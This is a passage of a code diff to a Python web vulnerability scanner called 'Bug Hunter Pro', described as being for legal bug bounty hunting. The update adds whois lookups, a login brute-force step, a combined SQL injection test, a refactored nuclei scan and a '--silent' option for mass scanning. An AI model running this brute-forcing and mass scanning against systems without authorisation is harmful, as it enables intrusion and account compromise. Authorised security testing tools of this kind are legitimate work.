             "csrf": self.check_csrf,
@@ -2908,6 +2864,7 @@ class BugHunterPro:
             "session_fixation": self.check_session_fixation,
             "api_token_leak": self.check_api_token_leak,
             "security_headers": self.check_security_headers,
+            "whois": self.run_whois,
         }
         if module_name in module_map:
             self.log("run", f"Running module: {module_name}")
@@ -2922,7 +2879,7 @@ class BugHunterPro:
 
     def run(self, auto_confirm: bool = False) -> None:
         self.log("info", f"Starting scan on {self.target}")
-        print(f"\n🎯 Bug Hunter Pro V1.5 — Ultimate Auto Vuln Hunter")
+        print(f"\n🎯 Bug Hunter Pro V1.5.5 — Ultimate Auto Vuln Hunter")
         print(f"Target: {self.target}")
         if self.scope_regex:
             print(f"Scope Regex: {self.scope_regex}")
@@ -2933,7 +2890,7 @@ class BugHunterPro:
         print(f"Shell files: {', '.join(self.shell_files)}")
         print(f"Config file: {self.config_path}")
         print(f"Payloads dir: {self.payloads_dir}")
-        print("="*60)
+        print("=" * 60)
         if not auto_confirm:
             self.log(
                 "warn",
@@ -2959,6 +2916,8 @@ class BugHunterPro:
             return
 
         try:
+            self.ensure_bruteforce_wordlist()
+
             self.log(
                 "info",
                 f"Initial visited_urls: {
@@ -2975,7 +2934,10 @@ class BugHunterPro:
                 self.log("warn", "Scan cancelled.")
                 return
 
-            test_response = self._make_request(self.target, timeout=10)
+            self.run_whois()
+
+            test_response = self._safe_request("GET",
+                                               self.target, timeout=10)
             if not test_response:
                 self.log(
                     "error", f"Cannot connect to initial target {
@@ -2988,6 +2950,7 @@ class BugHunterPro:
             if self.stop_event.is_set():
                 self.log("warn", "Scan cancelled.")
                 return
+
             all_hosts = list(set([self.host] + [s for s in subdomains if s]))
             if self.stop_event.is_set():
                 self.log("warn", "Scan cancelled.")
@@ -3018,14 +2981,16 @@ class BugHunterPro:
                 self.log("warn", "Scan cancelled.")
                 return
             self.crawl()
+
+            if not self.stop_event.is_set():
+                self._discover_paths_from_config()
+
             if not self.stop_event.is_set():
                 self.check_security_headers()
             if not self.stop_event.is_set():
                 self.check_xss()
             if not self.stop_event.is_set():
-                self.check_sqli_error_based()
-            if not self.stop_event.is_set():
-                self.check_sqli_time_based()
+                self.test_sql_injection()
             if not self.stop_event.is_set():
                 self.check_ssti()
             if not self.stop_event.is_set():
@@ -3089,42 +3054,18 @@ class BugHunterPro:
                     self.db_timeout,
                     self.full_port_scan)
 
-            if (self.enable_httpx or self.db_deep_scan) and not self.dry_run and not self.stop_event.is_set():
-                self.log("run", "Preparing nuclei scan...")
-                nuclei_report_path = os.path.join(
-                    self.output_dir, "nuclei_report.json")
-                nuclei_cmd = [
-                    "nuclei",
-                    "-u",
-                    self.target,
-                    "-jsonl",
-                    "-o",
-                    nuclei_report_path]
-                if self.proxy:
-                    nuclei_cmd.extend(["-proxy", self.proxy])
-                try:
-                    self.log(
-                        "debug", f"Executing nuclei: {
-                            ' '.join(nuclei_cmd)}")
-                    result = subprocess.run(
-                        nuclei_cmd,
-                        capture_output=True,
-                        text=True,
-                        check=False,
-                        encoding='ascii',
-                        errors='replace')
-                    self.log("debug", f"Nuclei stdout: {result.stdout}")
-                    self.log("debug", f"Nuclei stderr: {result.stderr}")
-                    if result.returncode == 0:
-                        self.log("success", "Nuclei scan completed")
-                        self._parse_nuclei_report(nuclei_report_path)
-                    else:
-                        self.log(
-                            "error", f"Nuclei scan failed with exit code {
-                                result.returncode}: {
-                                result.stderr}")
-                except Exception as e:
-                    self.log("error", f"Nuclei execution failed: {str(e)}")
+            if os.path.exists(
+                    self.bruteforce_wordlist) and not self.stop_event.is_set():
+                self.bruteforce_login(
+                    self.bruteforce_wordlist,
+                    self.bruteforce_username,
+                    self.bruteforce_threads,
+                    self.bruteforce_stop_on_success,
+                    self.bruteforce_throttle
+                )
+
+            if not self.dry_run and not self.stop_event.is_set():
+                self._run_nuclei_scan()
 
             self.log(
                 "success", f"Scan completed. Total score: {self.total_score}/100. Findings: {len(self.findings)}")
@@ -3152,12 +3093,24 @@ class BugHunterPro:
                     matched_at = nuclei_finding.get('matched-at', self.target)
                     score = SEVERITY_SCORES.get(severity, 0)
 
-                    self.findings.append({"severity": severity,
-                                          "message": f"Nuclei: {message} at {matched_at}",
-                                          "evidence": nuclei_finding,
-                                          "score": score,
-                                          "timestamp": _get_full_timestamp()})
+                    self.findings.append(
+                        {
+                            "severity": severity,
+                            "module": "Nuclei",
+                            "message": f"Nuclei: {message}",
+                            "url": matched_at,
+                            "payload": nuclei_finding.get(
+                                'template-id',
+                                'N/A'),
+                            "evidence": {
+                                "proof": "Matched Nuclei template.",
+                                "details": nuclei_finding},
+                            "score": score,
+                            "timestamp": _get_full_timestamp()})
                     self.total_score += score
+
+                    if severity in ["high", "critical"]:
+                        self.log("info", f"High/Critical Nuclei finding at {matched_at}. Screenshot feature is disabled.")
                     self.log(
                         "warn",
                         f"Nuclei: {message} at {matched_at}",
@@ -3170,7 +3123,7 @@ class BugHunterPro:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Bug Hunter Pro V1.5 — For legal bug bounty hunting")
+        description="Bug Hunter Pro V1.5.5 — For legal bug bounty hunting")
     parser.add_argument("url", help="Target URL (e.g., https://target.com)")
     parser.add_argument(
         "--output-dir",
@@ -3258,6 +3211,9 @@ def main():
     parser.add_argument(
         "--modules",
         help="Run multiple specific modules, comma-separated")
+    parser.add_argument(
+        "--silent", action="store_true", help="Disable all console output for mass scanning."
+    )
     args = parser.parse_args()
     try:
         parsed_url = urlparse(args.url)
